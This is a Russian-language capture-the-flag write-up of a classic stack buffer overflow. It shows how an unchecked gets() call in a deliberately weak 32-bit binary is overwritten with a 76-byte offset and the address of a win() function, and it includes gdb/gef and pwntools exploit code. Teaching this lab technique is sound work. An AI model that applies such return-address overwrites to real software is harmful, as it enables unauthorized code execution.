# Анализ файла
Итак нам даны 2 файла - task.elf и task.c . Для начала нужно понять методы защиты для файла, для этого можно использовать утилиту `checksec`


![](screenshot/1.png)

Итак, мы видим что все методы защиты отключены. Теперь можно перейти к анализу исходного кода в файле `task.c`

Vs сразу видим функцию `win` которая явно выводит флаг. Но она нигде не вызывается, так что нужно как заставить код ее исполнить
```C
void win() {
    FILE *file;
    char buffer[256]; // Буфер для чтения данных

    // Открытие файла FLAG.MD для чтения
    file = fopen("FLAG.MD", "r");
    if (file == NULL) {
        printf("Ошибка: не удалось открыть файл FLAG.MD\n");
        return;
    }

    // Чтение строки из файла и вывод её на экран
    while (fgets(buffer, sizeof(buffer), file) != NULL) {
        printf("%s", buffer);
    }

    // Закрытие файла
    fclose(file);
}

```


В файле полно функций, но после анализа, можно заметить, что данные пользователя мы получаем используя функцию `gets` . Если выйти в интернет с этим вопросом, можно увидеть, что везьде функция считается не безопасной, т.к не проверяет длинну ввода данных. Вот оно, наша уязвимая функция, любезно предоставленная разработчиками C . 

# Эксплуатация

После того как мы нашли уязвимость, нужно доказать, что ее можно проэксплуатировать. Для этого подадим большой объем данных в функцию

![](screenshot/2.png)

Бинго. Но что бы вызвать функцию `win` этого мало. (*В дальшейшем предполагается что вы уже знакомы со структурой стека в памяти. Если нет -  вот хорошая [статья](https://www.scaler.in/what-is-stack-organization/)*)

Что бы определить, сколько именно символов нужно что бы перезаписать `eip`(регистр хранящий адресс возврата),  можно использовать gdb+[gef](https://github.com/hugsy/gef) , а так же команду `cyclic` генерирующую строку-паттер

```bash
gdb task
shell cyclic 200

```

![](screenshot/3.png)


далее получившийся паттер передаем в функцию, и вводим команду `pattern search <значение регистра eip>`

![](screenshot/4.png)

![](screenshot/5.png)

Итак, теперь у нас есть число символов, до регистра eip. это значит, что начиная с 77 символа нам нужно передать адрес функции `win` . Узнать его просто - ввести в gdb команду `info function win`

![](screenshot/6.png) 

Когда у нас есть адрес и смещение, мы можно начать писать payload. Мы будем использовать библиотеку `pwntools` для python.

Для начала сфолрмируем payload. Он будет состоять из 76 символов(каких нее важно, я буду использовать `A`) и адреса. Однако просто ввести адрес не получится, нужно адаптировать его для формата `little-endian` . Для этого мы будем использовать функциюб `p32` из библиотеку `pwntools` 

```python
payload = b"A"*76 + p32(0x080491e6)
```


Итак когда payload готов, осталось отправить его на nc сервер, и считать флаг. Все функции для этого так же есть в `pwntools`


```python3
p = remote(host, port)      
log.info(p.recvS())        
p.sendline(payload)         
log.success(p.recvallS())  
p.close()                  
```

тиеперь собираем эксплойт и запускаем


![](screenshot/7.png) 

Вуаля, мы получили флаг


